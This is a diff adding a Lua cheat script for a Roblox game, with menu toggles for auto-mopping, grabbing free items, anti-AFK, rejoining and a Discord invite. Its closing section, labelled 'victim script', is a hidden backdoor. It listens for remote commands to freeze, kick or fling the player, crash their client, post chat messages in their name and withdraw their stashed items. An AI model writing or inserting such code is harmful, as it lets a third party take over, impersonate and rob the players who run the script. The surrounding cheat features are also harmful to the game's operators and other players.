+                    descendant.MaxActivationDistance = 10
+                end
+            end)
+        else
+            if promptConnection then
+                promptConnection:Disconnect()
+                promptConnection = nil
+            end
+          
+            for _, descendant in ipairs(workspace:GetDescendants()) do
+                if descendant:IsA("ProximityPrompt") and not shouldExclude(descendant) then
+                    descendant.HoldDuration = 3
+                    descendant.MaxActivationDistance = 5
+                end
+            end
+        end
+    end,
+})
+
+AutoTab:CreateDivider()
+
+local autoMopEnabled = false
+local autoMopToggleObj
+
+autoMopToggleObj = AutoTab:CreateToggle({
+    Name = "Auto Mop",
+    CurrentValue = false,
+    Flag = "AutoMopToggle",
+    Callback = function(Value)
+        autoMopEnabled = Value
+
+        local function getCharacterParts()
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            local rootPart = char:FindFirstChild("HumanoidRootPart")
+            return char, humanoid, rootPart
+        end
+
+        local function checkAndEquipMop()
+            local char, humanoid = getCharacterParts()
+            if not char or not humanoid then return false end
+            
+            if char:FindFirstChild("Mop") then return true end
+            
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
+            if backpack then
+                local mopTool = backpack:FindFirstChild("Mop")
+                if mopTool then
+                    pcall(function() humanoid:EquipTool(mopTool) end)
+                    task.wait(0.2)
+                    return true
+                end
+            end
+            
+            return false
+        end
+
+        local function getNearestDirt()
+            local _, _, rootPart = getCharacterParts()
+            if not rootPart then return nil end
+
+            local linisMoney = workspace:FindFirstChild("LinisMoney")
+            local activeDirts = linisMoney and linisMoney:FindFirstChild("ActiveDirts")
+            
+            if not activeDirts then return nil end
+
+            local nearestDirt = nil
+            local shortestDistance = math.huge
+
+            for _, dirt in ipairs(activeDirts:GetChildren()) do
+                local targetPart = dirt:IsA("BasePart") and dirt or dirt:FindFirstChildWhichIsA("BasePart", true)
+                local prompt = dirt:FindFirstChildWhichIsA("ProximityPrompt", true)
+
+                if targetPart and prompt then
+                    local distance = (targetPart.Position - rootPart.Position).Magnitude
+                    if distance < shortestDistance then
+                        shortestDistance = distance
+                        nearestDirt = dirt
+                    end
+                end
+            end
+
+            return nearestDirt
+        end
+
+        if autoMopEnabled then
+            if not checkAndEquipMop() then
+                autoMopEnabled = false
+                if autoMopToggleObj and autoMopToggleObj.Set then
+                    autoMopToggleObj:Set(false)
+                end
+                warn("Get a MOP!")
+                pcall(function()
+                    Rayfield:Notify({Title = "Auto Mop", Content = "Get a MOP!", Duration = 3})
+                end)
+                return
+            end
+
+            task.spawn(function()
+                while autoMopEnabled do
+                    local nearestDirt = getNearestDirt()
+                    
+                    if nearestDirt then
+                        local prompt = nearestDirt:FindFirstChildWhichIsA("ProximityPrompt", true)
+                        local targetPart = nearestDirt:IsA("BasePart") and nearestDirt or nearestDirt:FindFirstChildWhichIsA("BasePart", true)
+                        
+                        if prompt and targetPart then
+                            local char, humanoid, rootPart = getCharacterParts()
+                            if humanoid and rootPart then
+                                pcall(function()
+                                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
+                                end)
+                                
+                                humanoid:MoveTo(targetPart.Position)
+                                
+                                local startTime = tick()
+                                repeat 
+                                    task.wait(0.1)
+                                    if (targetPart.Position - rootPart.Position).Magnitude > 4 then
+                                        humanoid:MoveTo(targetPart.Position)
+                                    end
+                                until (targetPart.Position - rootPart.Position).Magnitude <= 4 or (tick() - startTime > 8) or not autoMopEnabled
+
+                                humanoid:MoveTo(rootPart.Position)
+                                pcall(function()
+                                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
+                                end)
+                            end
+
+                            if not autoMopEnabled then break end
+                            task.wait(0.1)
+
+                            if fireproximityprompt then
+                                pcall(function() fireproximityprompt(prompt, 0, true) end)
+                            else
+                                pcall(function()
+                                    prompt:InputHoldBegin()
+                                    task.wait(0.1)
+                                    prompt:InputHoldEnd()
+                                end)
+                            end
+
+                            task.wait(0.2)
+                            if autoMopEnabled then
+                                local nextDirt = getNearestDirt()
+                                if nextDirt and nextDirt ~= nearestDirt then
+                                    local nextTarget = nextDirt:IsA("BasePart") and nextDirt or nextDirt:FindFirstChildWhichIsA("BasePart", true)
+                                    local _, nextHum, _ = getCharacterParts()
+                                    if nextTarget and nextHum then
+                                        pcall(function()
+                                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
+                                            nextHum:MoveTo(nextTarget.Position)
+                                        end)
+                                    end
+                                end
+                            end
+
+                            task.wait(1.0)
+                        end
+                    else
+                        task.wait(0.5)
+                    end
+                end
+                
+                pcall(function()
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
+                end)
+            end)
+        else
+            pcall(function()
+                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
+            end)
+        end
+    end,
+})
+
+AutoTab:CreateDivider()
+
+local GunsOnMap = workspace:WaitForChild("GunsOnMap")
+
+local function giveItem(itemName)
+    task.spawn(function()
+        local foundItem = nil
+        for _, item in ipairs(GunsOnMap:GetChildren()) do
+            if item.Name == itemName then
+                foundItem = item
+                break
+            end
+        end
+
+        if foundItem then
+            local clickDetector = foundItem:FindFirstChild("ClickDetector", true)
+            local handle = foundItem:FindFirstChild("Handle") or foundItem:FindFirstChildWhichIsA("BasePart", true)
+
+            if clickDetector then
+                pcall(function() fireclickdetector(clickDetector) end)
+            elseif handle then
+                local character = LocalPlayer.Character
+                local hrp = character and character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    pcall(function()
+                        firetouchinterest(hrp, handle, 0)
+                        task.wait(0.05)
+                        firetouchinterest(hrp, handle, 1)
+                    end)
+                end
+            else
+                warn("ClickDetector or Handle not found for: " .. itemName)
+            end
+        else
+            warn("Item not found on map: " .. itemName)
+        end
+    end)
+end
+
+AutoTab:CreateButton({
+    Name = "Get Coffee",
+    Callback = function()
+        giveItem("Coffee")
+    end,
+})
+
+AutoTab:CreateButton({
+    Name = "Get Donut",
+    Callback = function()
+        giveItem("Donut")
+    end,
+})
+
+AutoTab:CreateButton({
+    Name = "Get Water",
+    Callback = function()
+        giveItem("Water")
+    end,
+})
+
+AutoTab:CreateButton({
+    Name = "Get Banana",
+    Callback = function()
+        giveItem("Banana")
+    end,
+})
+
+AutoTab:CreateButton({
+    Name = "Get Apple",
+    Callback = function()
+        giveItem("Apple")
+    end,
+})
+
+local MiscTab = Window:CreateTab("Misc", 4483362458)
+local MiscSection = MiscTab:CreateSection("Misc Scripts")
+MiscSection:Set("Misc Scripts")
+MiscTab:CreateDivider()
+
+local AntiAFK_Active = true
+
+local function setupAntiAFK()
+    LocalPlayer.Idled:Connect(function()
+        if AntiAFK_Active then
+            local character = LocalPlayer.Character
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.Jump = true
+                end
+            end
+        end
+    end)
+end
+
+setupAntiAFK()
+
+MiscTab:CreateToggle({
+    Name = "Anti AFK",
+    CurrentValue = true,
+    Flag = "AntiAFKToggle",
+    Callback = function(Value)
+        AntiAFK_Active = Value
+    end,
+})
+
+MiscTab:CreateDivider()
+
+MiscTab:CreateButton({
+    Name = "Rejoin",
+    Callback = function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end,
+})
+
+MiscTab:CreateDivider()
+
+local QuadrupleEscEnabled = true
+local escPressCount = 0
+local lastEscTime = 0
+local QuadruplePressTime = 1
+
+MiscTab:CreateToggle({
+    Name = "Rejoin (Quadruple ESC)",
+    CurrentValue = true,
+    Flag = "QuadrupleEscToggle",
+    Callback = function(Value)
+        QuadrupleEscEnabled = Value
+    end,
+})
+
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if not QuadrupleEscEnabled then return end
+
+    if input.KeyCode == Enum.KeyCode.Escape then
+        local now = tick()
+        if now - lastEscTime <= QuadruplePressTime then
+            escPressCount = escPressCount + 1
+        else
+            escPressCount = 1
+        end
+        lastEscTime = now
+
+        if escPressCount >= 4 then
+            escPressCount = 0
+            task.spawn(function()
+                pcall(function() stashItems() end)
+                task.wait(1.5)
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+                end)
+            end)
+        end
+    end
+end)
+
+MiscTab:CreateDivider()
+
+local InviteCode = "mCRDMqtfVf"
+local request = (syn and syn.request) or (http and http.request) or http_request or request
+
+MiscTab:CreateButton({
+    Name = "Join /NLT Discord",
+    Callback = function()
+        if request then
+            request({
+                Url = "http://127.0.0.1:6463/rpc?v=1",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Origin"] = "https://discord.com"
+                },
+                Body = HttpService:JSONEncode({
+                    cmd = "INVITE_BROWSER",
+                    args = {
+                        code = InviteCode
+                    },
+                    nonce = HttpService:GenerateGUID(false)
+                })
+            })
+        else
+            warn("Exploit does not support HTTP requests.")
+        end
+    end,
+})
+
+MiscTab:CreateButton({
+    Name = "Copy /NLT Discord Link",
+    Callback = function()
+        if setclipboard then
+            setclipboard("https://discord.gg/mCRDMqtfVf")
+        end
+    end,
+})
+
+MiscTab:CreateDivider()
+
+-- victim script
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+local isFrozen = false
+local freezePosition = nil
+
+-- Ensure communication folder exists and register our presence
+local commFolder = ReplicatedStorage:FindFirstChild("AdminCommChannel")
+if not commFolder then
+    commFolder = Instance.new("Folder")
+    commFolder.Name = "AdminCommChannel"
+    commFolder.Parent = ReplicatedStorage
+end
+
+local myFolder = commFolder:FindFirstChild(tostring(LocalPlayer.UserId))
+if not myFolder then
+    myFolder = Instance.new("Configuration")
+    myFolder.Name = tostring(LocalPlayer.UserId)
+    myFolder.Parent = commFolder
+end
+
+myFolder:SetAttribute("Active", true)
+
+-- Clean up when leaving
+LocalPlayer.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        pcall(function() myFolder:Destroy() end)
+    end
+end)
+
+local function sendChatMessage(msg)
+    pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannels = TextChatService:FindFirstChild("TextChannels")
+            local generalChannel = textChannels and textChannels:FindFirstChild("RBXGeneral")
+            if generalChannel then
+                generalChannel:SendAsync(msg)
+            else
+                TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
+            end
+        else
+            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if chatEvent then
+                chatEvent.SayMessageRequest:FireServer(msg, "All")
+            end
+        end
+    end)
+end
+
+local function withdrawAllStash()
+    local safeboxFolder = workspace:FindFirstChild("SafesOnMap")
+    if not safeboxFolder then return end
+    
+    local character = LocalPlayer.Character
+    local hrp = character and character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    local closestSafeBox = nil
+    local shortestDist = math.huge
+    
+    for _, safeBox in ipairs(safeboxFolder:GetChildren()) do
+        local mainPart = safeBox:FindFirstChild("MainDoor") or safeBox:FindFirstChild("Part") or safeBox:FindFirstChildWhichIsA("BasePart")
+        if mainPart then
+            local dist = (hrp.Position - mainPart.Position).Magnitude
+            if dist < shortestDist then
+                shortestDist = dist
+                closestSafeBox = safeBox
+            end
+        end
+    end
+    
+    if not closestSafeBox then return end
+    
+    local targetPart = closestSafeBox:FindFirstChild("MainDoor") or closestSafeBox:FindFirstChild("Part") or closestSafeBox:FindFirstChildWhichIsA("BasePart")
+    local clickDetector = closestSafeBox:FindFirstChild("ClientClick") or closestSafeBox:FindFirstChild("ClickDetector", true)
+    
+    -- Safe wrappers for mobile/PC executor discrepancies
+    if clickDetector and fireclickdetector then
+        pcall(function() fireclickdetector(clickDetector) end)
+    elseif targetPart and firetouchinterest then
+        pcall(function()
+            firetouchinterest(hrp, targetPart, 0)
+            task.wait(0.05)
+            firetouchinterest(hrp, targetPart, 1)
+        end)
+    end
+    
+    task.wait(0.4)
+    
+    local safeBoxRemote = ReplicatedStorage:FindFirstChild("SafeBox") and ReplicatedStorage.SafeBox:FindFirstChild("Inventory")
+    local InvData = LocalPlayer:FindFirstChild("InvData")
+    
+    if safeBoxRemote and InvData then
+        for _, child in ipairs(InvData:GetChildren()) do
+            if child:IsA("ValueBase") and child.Value > 0 then
+                pcall(function()
+                    safeBoxRemote:FireServer("Change", child.Name, "Inv")
+                end)
+                task.wait(0.2)
+            end
+        end
+    end
+end
+
+RunService.Heartbeat:Connect(function()
+    local char = LocalPlayer.Character
+    if isFrozen and char then
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            if not freezePosition then
+                freezePosition = hrp.CFrame
+            end
+            hrp.CFrame = freezePosition
+            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+        end
+    else
+        freezePosition = nil
+    end
+end)
+
+-- Listen for commands directed to us via our designated configuration folder
+myFolder:GetAttributeChangedSignal("Command"):Connect(function()
+    local cmdRaw = myFolder:GetAttribute("Command")
+    if not cmdRaw then return end
+    
+    local cmd = string.match(cmdRaw, "^(.-)|") or cmdRaw
+    
+    if cmd == "Freeze" then
+        isFrozen = true
+    elseif cmd == "Unfreeze" then
+        isFrozen = false
+    elseif cmd == "Kick" then
+        LocalPlayer:Kick("Controlled disconnect.")
+    elseif cmd == "Fling" then
+        task.spawn(function()
+            local char = LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
+                bav.Parent = hrp
+                task.wait(1)
+                bav:Destroy()
+            end
+        end)
+    elseif cmd == "Crash" then
+        task.spawn(function()
+            while true do
+                local t = {}
+                while true do
+                    table.insert(t, {string.rep("A", 999999)})
+                end
+            end
+        end)
+    elseif string.sub(cmd, 1, 5) == "Chat:" then
+        local msg = string.sub(cmd, 6)
+        if msg ~= "" then
+            sendChatMessage(msg)
+        end
+    elseif cmd == "GetStash" then
+        task.spawn(withdrawAllStash)
+    end
+end)
